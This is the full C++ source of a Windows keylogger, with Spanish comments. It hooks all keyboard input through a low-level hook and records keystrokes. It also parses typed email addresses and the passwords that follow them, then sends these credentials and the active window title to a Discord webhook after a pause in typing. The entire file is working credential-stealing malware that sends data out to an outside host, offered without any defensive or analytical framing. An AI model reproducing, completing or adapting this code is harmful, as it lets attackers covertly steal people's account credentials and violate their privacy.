// ============================================================
//  keylogger.cpp — Rediseñado con detección de campos
//  Maneja errores de tipeo y extrae credenciales correctamente
// ============================================================
#include "keylogger.h"
#include "discord.h"
#include "config.h"
#include <windows.h>
#include <string>
#include <mutex>
#include <atomic>
#include <chrono>
#include <sstream>

// ============================================================
//  Globals
// ============================================================
static HHOOK        g_hook = NULL;
static std::wstring g_buffer = L"";
static std::mutex   g_mutex;
static HWND         g_ultimaVentana = NULL;
std::atomic<int>    g_teclas_contador{0};

// Credential tracking
static std::wstring g_field_actual = L"";
static std::wstring g_usuario_detectado = L"";
static std::wstring g_password_detectado = L"";
static std::chrono::steady_clock::time_point g_ultima_tecla;
static std::atomic<bool> g_hay_pendientes{false};
static std::chrono::steady_clock::time_point g_ultima_alerta;

// ============================================================
//  Convertir vkCode → wchar_t (char real)
// ============================================================
static wchar_t ConvertirTecla(DWORD vkCode, DWORD scanCode, bool shift, bool caps) {
    wchar_t buffer[8] = {0};
    BYTE keyboardState[256] = {0};
    GetKeyboardState(keyboardState);
    if (shift) keyboardState[VK_SHIFT] = 0x80;
    if (caps)  keyboardState[VK_CAPITAL] = 0x01;

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 8, 0);
    if (result >= 1) return buffer[0];
    return 0;
}

// ============================================================
//  Verificar si un string es un email
// ============================================================
static bool EsEmail(const std::wstring& s) {
    size_t at = s.find(L'@');
    if (at == std::wstring::npos || at < 2) return false;
    size_t punto = s.find(L'.', at);
    if (punto == std::wstring::npos || punto < at + 2) return false;
    if (punto >= s.size() - 1) return false;
    return true;
}

// ============================================================
//  Extraer email y resto (posible password) de un string
// ============================================================
static bool ExtraerEmail(const std::wstring& s, std::wstring& email, std::wstring& resto) {
    size_t at = s.find(L'@');
    if (at == std::wstring::npos || at < 2) return false;

    // Inicio del email (ir hacia atrás hasta encontrar separador)
    size_t inicio = at;
    while (inicio > 0 &&
           s[inicio-1] != L' ' && s[inicio-1] != L'\t' &&
           s[inicio-1] != L'\n' && s[inicio-1] != L':' &&
           s[inicio-1] != L';' && s[inicio-1] != L',') {
        inicio--;
    }

    // Punto después del @
    size_t punto = s.find(L'.', at);
    if (punto == std::wstring::npos) return false;

    // TLD: máximo 4 letras (com, net, org, info, etc.)
    size_t fin = punto + 1;
    int tldLen = 0;
    while (fin < s.size() && tldLen < 4 && iswalpha(s[fin])) {
        fin++;
        tldLen++;
    }

    if (tldLen < 2) return false;

    email = s.substr(inicio, fin - inicio);

    // El resto después del email
    if (fin < s.size()) {
        resto = s.substr(fin);
        size_t i = resto.find_first_not_of(L" \t\n;,");
        if (i != std::wstring::npos) resto = resto.substr(i);
        else resto.clear();
    } else {
        resto.clear();
    }

    return true;
}

// ============================================================
//  Procesar campo terminado (TAB o ENTER)
// ============================================================
static void ProcesarCampoTerminado() {
    if (g_field_actual.empty()) return;

    std::wstring email, resto;
    if (ExtraerEmail(g_field_actual, email, resto)) {
        // El campo contiene un email
        g_usuario_detectado = email;
        if (resto.size() >= 2) {
            g_password_detectado = resto;
            g_hay_pendientes = true;
        }
    } else if (!g_usuario_detectado.empty() && g_password_detectado.empty()) {
        // No es email pero ya tenemos usuario → es password
        if (g_field_actual.size() >= 2) {
            g_password_detectado = g_field_actual;
            g_hay_pendientes = true;
        }
    }
}

// ============================================================
//  Traducir tecla a formato display (para #teclas-capturadas)
// ============================================================
static std::wstring TraducirTecla(DWORD vkCode, DWORD scanCode, bool shift, bool caps, bool altGr) {
    wchar_t buffer[64] = {0};
    BYTE keyboardState[256] = {0};
    GetKeyboardState(keyboardState);
    if (shift) keyboardState[VK_SHIFT] = 0x80;
    if (caps)  keyboardState[VK_CAPITAL] = 0x01;
    if (altGr) {
        keyboardState[VK_RCONTROL] = 0x80;
        keyboardState[VK_RMENU] = 0x80;
    }

    switch (vkCode) {
        case VK_RETURN:   return L"[ENTER]\n";
        case VK_SPACE:    return L" ";
        case VK_TAB:      return L"[TAB]";
        case VK_BACK:     return L"[BKSP]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_DELETE:   return L"[DEL]";
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_LMENU:
        case VK_RMENU:    return L"";
        default: break;
    }

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 64, 0);
    if (result >= 1) return std::wstring(buffer, result);
    return L"";
}

// ============================================================
//  Callback del hook
// ============================================================
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool altGr = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;

            // Actualizar timestamp y contador
            g_ultima_tecla = std::chrono::steady_clock::now();
            g_teclas_contador++;

            // 1. Buffer display (para #teclas-capturadas)
            std::wstring t = TraducirTecla(kb->vkCode, kb->scanCode, shift, caps, altGr);
            if (!t.empty()) {
                std::lock_guard<std::mutex> lock(g_mutex);
                g_buffer += t;
                if (g_buffer.size() > 20000) {
                    g_buffer = g_buffer.substr(g_buffer.size() - 10000);
                }
            }

            // 2. Detección de credenciales (con char real)
            DWORD vk = kb->vkCode;

            if (vk == VK_BACK) {
                // Aplicar backspace al field
                if (!g_field_actual.empty()) g_field_actual.pop_back();
            }
            else if (vk == VK_TAB || vk == VK_RETURN) {
                // Campo terminado
                ProcesarCampoTerminado();
                g_field_actual.clear();
            }
            else {
                // Añadir char al field
                wchar_t ch = ConvertirTecla(vk, kb->scanCode, shift, caps);
                if (ch >= 32) {
                    g_field_actual += ch;

                    // Detección temprana (autofill o mismo campo)
                    std::wstring email, resto;
                    if (ExtraerEmail(g_field_actual, email, resto)) {
                        g_usuario_detectado = email;
                        if (resto.size() >= 2) {
                            g_password_detectado = resto;
                            g_hay_pendientes = true;
                        }
                    }
                }
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ============================================================
//  Hilo del hook
// ============================================================
static DWORD WINAPI HiloKeylogger(LPVOID) {
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
        GetModuleHandleW(NULL), 0);
    if (!g_hook) return 1;

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = NULL; }
    return 0;
}

// ============================================================
//  Hilo que envía credenciales tras 3s de inactividad
// ============================================================
static DWORD WINAPI HiloCredenciales(LPVOID) {
    while (true) {
        Sleep(500);

        if (!g_hay_pendientes) continue;

        auto ahora = std::chrono::steady_clock::now();
        auto diff = std::chrono::duration_cast<std::chrono::milliseconds>(
            ahora - g_ultima_tecla).count();

        // Solo enviar si han pasado 3 segundos sin teclas
        if (diff < 3000) continue;

        // Cooldown de 15s para no spamear
        auto diffAlerta = std::chrono::duration_cast<std::chrono::seconds>(
            ahora - g_ultima_alerta).count();
        if (diffAlerta < 15) {
            g_hay_pendientes = false;
            continue;
        }

        // Enviar alerta
        {
            HWND hwnd = GetForegroundWindow();
            wchar_t titulo[256] = {0};
            GetWindowTextW(hwnd, titulo, 256);

            std::wstringstream ss;
            ss << L"🚨 **CREDENCIALES COMPROMETIDAS**\n"
               << L"━━━━━━━━━━━━━━━━━━━━━━━\n"
               << L"🪟 **Ventana:** `" << titulo << L"`\n"
               << L"━━━━━━━━━━━━━━━━━━━━━━━\n";

            if (!g_usuario_detectado.empty())
                ss << L"📧 **Usuario:** `" << g_usuario_detectado << L"`\n";
            if (!g_password_detectado.empty())
                ss << L"🔑 **Password:** `" << g_password_detectado << L"`";

            ss << L"\n━━━━━━━━━━━━━━━━━━━━━━━";

            DiscordEnviarTexto(WEBHOOK_ALERTAS, ss.str());
        }

        // Reset
        g_ultima_alerta = ahora;
        g_hay_pendientes = false;
        g_usuario_detectado.clear();
        g_password_detectado.clear();
        g_field_actual.clear();

        Sleep(15000);
    }
    return 0;
}

// ============================================================
//  API pública
// ============================================================
void IniciarKeylogger() {
    CreateThread(NULL, 0, HiloKeylogger, NULL, 0, NULL);
    CreateThread(NULL, 0, HiloCredenciales, NULL, 0, NULL);
}

void DetenerKeylogger() {
    if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = NULL; }
}

std::wstring ObtenerBufferTeclas() {
    std::lock_guard<std::mutex> lock(g_mutex);
    std::wstring copia = g_buffer;
    g_buffer.clear();
    return copia;
}